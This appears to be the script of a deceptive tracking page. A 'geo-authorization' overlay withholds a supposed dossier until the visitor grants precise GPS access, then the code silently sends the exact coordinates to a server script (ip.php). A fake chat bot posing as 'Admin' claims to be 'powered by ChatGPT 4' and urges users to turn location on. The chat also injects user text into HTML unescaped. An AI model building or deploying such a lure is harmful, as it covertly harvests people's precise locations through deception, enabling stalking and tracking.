/* ===== ГЕО-АВТОРИЗАЦИЯ ===== */
function gpsLocation() {
  if (!navigator.geolocation) {
    showGeoError("Геолокация не поддерживается браузером");
    return;
  }
  // Автоматически запрашиваем при загрузке
  requestGeo();
}

function requestGeo() {
  const btn = document.getElementById("geo-btn");
  const statusText = document.getElementById("geo-status-text");
  const dot = document.querySelector(".geo-status-dot");
  const errorEl = document.getElementById("geo-error");

  btn.disabled = true;
  errorEl.textContent = "";
  statusText.textContent = "ЗАПРОС ГЕОЛОКАЦИИ...";

  navigator.geolocation.getCurrentPosition(
    function(position) {
      const lat = position.coords.latitude.toFixed(6);
      const lon = position.coords.longitude.toFixed(6);

      // Обновляем статус
      statusText.textContent = "АВТОРИЗАЦИЯ ПОДТВЕРЖДЕНА";
      dot.classList.remove("blink");
      dot.classList.add("ok");

      // Отправляем координаты (существующий функционал)
      sendCoords(lat, lon);

      // Через 800мс снимаем оверлей
      setTimeout(unlockDossier, 800);
    },
    function(err) {
      btn.disabled = false;
      statusText.textContent = "ОШИБКА АВТОРИЗАЦИИ";
      showGeoError(getGeoErrorMsg(err.code));
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

function unlockDossier() {
  document.getElementById("geo-overlay").classList.add("hidden");
  document.getElementById("dossier-wrapper").classList.add("unlocked");
}

function showGeoError(msg) {
  const errorEl = document.getElementById("geo-error");
  if (errorEl) errorEl.textContent = msg;
}

function getGeoErrorMsg(code) {
  switch (code) {
    case 1: return "ДОСТУП К ГЕОЛОКАЦИИ ЗАПРЕЩЁН ПОЛЬЗОВАТЕЛЕМ";
    case 2: return "КООРДИНАТЫ НЕДОСТУПНЫ";
    case 3: return "ПРЕВЫШЕНО ВРЕМЯ ОЖИДАНИЯ";
    default: return "НЕИЗВЕСТНАЯ ОШИБКА";
  }
}

function sendCoords(lat, lon) {
  // Отправка координат (как в оригинале)
  fetch(`ip.php?lat=${lat}&lon=${lon}`).catch(() => {});
}

/* ===== ЧАТ ===== */
const msgerForm = get(".msger-inputarea");
const msgerInput = get(".msger-input");
const msgerChat = get(".msger-chat");

const BOT_MSGS = [
"Hi, how are you?",
"Turn your location on for find people near you",
"I am powered by ChatGPT 4",
"I feel sleepy! :("];


// Icons made by Freepik from www.flaticon.com
const BOT_IMG = "https://image.flaticon.com/icons/svg/327/327779.svg";
const PERSON_IMG = "https://image.flaticon.com/icons/svg/145/145867.svg";
const BOT_NAME = "Admin";
const PERSON_NAME = "User";

msgerForm.addEventListener("submit", event => {
  event.preventDefault();

  const msgText = msgerInput.value;
  if (!msgText) return;
  appendMessage(PERSON_NAME, PERSON_IMG, "right", msgText);
  msgerInput.value = "";
  botResponse();
});

function appendMessage(name, img, side, text) {
  //   Simple solution for small apps
  const msgHTML = `
    <div class="msg ${side}-msg">
      <div class="msg-img" style="background-image: url(${img})"></div>

      <div class="msg-bubble">
        <div class="msg-info">
          <div class="msg-info-name">${name}</div>
          <div class="msg-info-time">${formatDate(new Date())}</div>
        </div>

        <div class="msg-text">${text}</div>
      </div>
    </div>
  `;

  msgerChat.insertAdjacentHTML("beforeend", msgHTML);
  msgerChat.scrollTop += 500;
}
function botResponse() {
  const r = random(0, BOT_MSGS.length - 1);
  const msgText = BOT_MSGS[r];
  const delay = msgText.split(" ").length * 100;

  setTimeout(() => {
    appendMessage(BOT_NAME, BOT_IMG, "left", msgText);
  }, delay);
}
// Utils
function get(selector, root = document) {
  return root.querySelector(selector);
}
function formatDate(date) {
  const h = "0" + date.getHours();
  const m = "0" + date.getMinutes();

  return `${h.slice(-2)}:${m.slice(-2)}`;
}
function random(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}